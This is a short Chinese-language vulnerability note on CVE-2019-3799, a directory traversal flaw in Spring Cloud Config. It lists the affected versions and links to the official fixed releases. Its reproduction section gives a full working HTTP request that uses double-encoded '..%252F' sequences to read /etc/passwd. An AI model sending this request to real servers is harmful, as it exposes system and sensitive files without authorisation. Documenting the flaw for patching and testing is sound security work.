# Spring Cloud Config 目录遍历漏洞 CVE-2019-3799

## 漏洞描述

由于 spring-cloud-config-server 模块未对传入路径进行安全限制，攻击者可以利用多个 `..%252f` 进行目录遍历，查看服务器其他路径的敏感文件，造成敏感信息泄露。

## 漏洞影响

```
Spring Cloud Config 2.1.0 to 2.1.1
Spring Cloud Config 2.0.0 to 2.0.3
Spring Cloud Config 1.4.0 to 1.4.5
```

## 漏洞复现

```
GET /foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.1
Host: your-ip:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

## 漏洞修复

Spring 官方最新版本已经对 Spring Cloud Config 目录遍历漏洞进行了修复，下载地址：https://github.com/spring-cloud/spring-cloud-config/releases
